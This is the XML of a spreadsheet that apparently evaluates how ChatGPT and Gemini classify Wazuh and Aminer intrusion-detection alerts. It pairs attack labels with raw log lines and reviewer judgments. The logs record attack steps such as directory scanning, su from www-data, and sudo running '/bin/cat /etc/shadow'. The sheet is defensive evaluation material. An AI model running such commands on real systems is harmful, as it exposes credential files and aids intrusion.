          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.022”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “GET /bea HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and repeated requests from same sourc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Dirb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="7" calcext:value-type="float">
            <text:p>7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /beheer HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and repeated requests from same source</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Dirb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Information Gathering,</text:p>
            <text:p>Reconnaissance,</text:p>
            <text:p>Exploitation Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Apache: Attempt to access forbidden file or directory.”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/plugins/.htpasswd_”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to forbidden file or directory</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Dirb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="6" calcext:value-type="float">
            <text:p>6</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Valid Accounts Abuse,</text:p>
            <text:p>Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”</text:p>
            <text:p>Raw Data: “miller-mail dovecot: imap-login: Login: user=&lt;megan.johnson&gt;, method=PLAIN, rip=192.168.129.212, lip=192.168.129.212, mpid=28005, TLS, session=&lt;o6XRidrVbpzAqIHU&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification and successful imap log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Protocol Anomaly,</text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Suricata: Alert - SURICATA HTTP unable to match response to request”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name Suricata and protocol name HTTP</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2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Valid Accounts Abuse,</text:p>
            <text:p>Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”</text:p>
            <text:p>Raw Data: “whittaker-mail dovecot: imap-login: Login: user=&lt;john.hammond&gt;, method=PLAIN, rip=192.168.131.228, lip=192.168.131.228, mpid=32153, TLS, session=&lt;mBtfmtrVyKjAqIPk&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification and successful imap logi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assword Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Brute Force,</text:p>
            <text:p>Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: User login failed.”, mitre – technique: “Password Guessing”, id: “T1110.001”, tactic: “Credential Access”</text:p>
            <text:p>Raw Data: “taylorcruz-mail auth: pam_unix(dovecot:auth): authentication failure; logname= uid=0 euid=0 tty=dovecot ruser=christopher.friedman rhost=192.168.128.195 user=christopher.friedman”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification and PAM user login failure</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Account Manipulation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “User successfully changed UID.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”,</text:p>
            <text:p>Raw Data: “intranet-server su[28816]: + /dev/pts/1 www-data:phopkins”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name su</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Valid Accounts</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: Login session opened.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”,</text:p>
            <text:p>Raw Data: “intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)”</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Valid Accounts</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: Login session opened.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”, </text:p>
            <text:p>Raw Data: “intranet-server systemd: pam_unix(systemd-user:session): session opened for user phopkins by (uid=0)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</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 </text:p>
            <text:p>Defense Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Successful sudo to ROOT executed.”, mitre – technique: “Sudo and Sudo Caching”, id: “T1548.003”, tactic: “Privilege Escalation”, “Defense Evasion”, </text:p>
            <text:p>Raw Data: “intranet-server sudo: phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list”</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Valid Accounts</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: Login session opened.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”, </text:p>
            <text:p>Raw Data: “intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification and tool name sudo</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">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Defense Evasion,</text:p>
            <text:p>Discovery</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ls -laR /root/”</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2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation,</text:p>
            <text:p>Defense Evasion,</text:p>
            <text:p>Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Successful sudo to ROOT executed.”, mitre – technique: “Sudo and Sudo Caching”, id: “T1548.003”, tactic: “Privilege Escalation”, “Defense Evasion”,</text:p>
            <text:p>Raw Data: “intranet-server sudo: phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification and tool name sudo</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Valid Accounts</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: Login session opened.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”,</text:p>
            <text:p>Raw Data: “intranet-server sudo: pam_unix(sudo:session): session opened for user root by (uid=0)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification and tool name sudo</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:formula="of:=SUM([.B2:.B35])" office:value-type="float" office:value="79" calcext:value-type="float">
            <text:p>79</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="notes" table:style-name="ta1">
        <table:table-column table:style-name="co1" table:number-columns-repeated="10" table:default-cell-style-name="Default"/>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>For Wazuh there are summary alerts containing and aggregating multiple alerts, those are usually the once with mitre labelles, the others do not have them</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Some classification tags have been added together, as they name the same types of lines. Especially for Reconnaissance this is true. Here the Reconnaissance classification is not always present but as it is the most general of the onces mentioned it is still kept. </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Needs to be checked: if the name suricata is included than the classifciation likely will contain something with network</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>For wazuh password cracking it is unclear how much the labelled lines can even be identified as password cracking by a human analyst</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>For the Aminer entries the log line is considered way more than the rest, while for wazuh the mitre classification is used a lot if present</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Both ChatGPT and Gemini often refers to other alerts even though it is told not to</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>For Run 2 Gemini Aminer the classifications are rather consistent if the input looks the same (nmap and WPScan) and the IDS message is the same; also for some dirb lines (e.g. reconnaissance with discovery)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>For Run 2 Gemini Aminer, dirb Reconnaissance, <text:s/>Information Disclosure Attempt &amp; Reconnaissance, Vulnerability Scanning have the same types of lines, so they look the same</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="10"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>For run 2 chatgpt aminer – chatgpt actually decodes the base64</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="10"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>the classifications for privilege escalation are often more detailed than the label</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="9"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="10"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Unauthorized Directory Access Attempt</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Attempt to access forbidden file or directory.”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Scanning is not represented in the classification</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>More detailed than attack label</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Run 4 wazuh chatgpt</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="10"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Application Scanning,</text:p>
            <text:p>Service Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”</text:p>
            <text:p>Raw Data: “POST /sdk HTTP/1.1 403 3260 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name nmap and http status code 403</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>More detailed than attack label</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Run 2 aminer chatgp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5">00/00/0000</text:date>, <text:time style:data-style-name="N2" text:time-value="09:44:34.5648848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3T08:53:48.027615777</meta:creation-date>
    <dc:date>2025-11-05T09:45:33.234061177</dc:date>
    <meta:editing-duration>P4DT13H43M24S</meta:editing-duration>
    <meta:editing-cycles>2845</meta:editing-cycles>
    <meta:generator>LibreOffice/25.2.6.2$Linux_X86_64 LibreOffice_project/40d1a0e1d5bdf1afaeae24d9ece32bbb00fa66a4</meta:generator>
    <meta:document-statistic meta:table-count="17" meta:cell-count="3921" meta:object-count="0"/>
  </office:meta>
</office:document-meta>
</file>